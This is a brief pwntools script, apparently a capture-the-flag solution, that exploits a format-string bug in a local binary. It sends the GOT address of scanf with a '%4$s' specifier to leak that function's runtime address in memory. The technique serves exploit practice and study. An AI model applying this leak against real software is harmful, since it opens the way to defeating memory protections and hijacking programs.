from pwn import *

sh = process('./pwn')
context.binary = './pwn'
e = ELF('./pwn')

_scanf_got = e.got['__isoc99_scanf']

payload = p32(_scanf_got) + b'%4$s'

sh.sendline(payload)

sh.recvuntil(b'%4$s\n')

_scanf_addr = u32(sh.recv()[4:8])

print(hex(_scanf_addr))

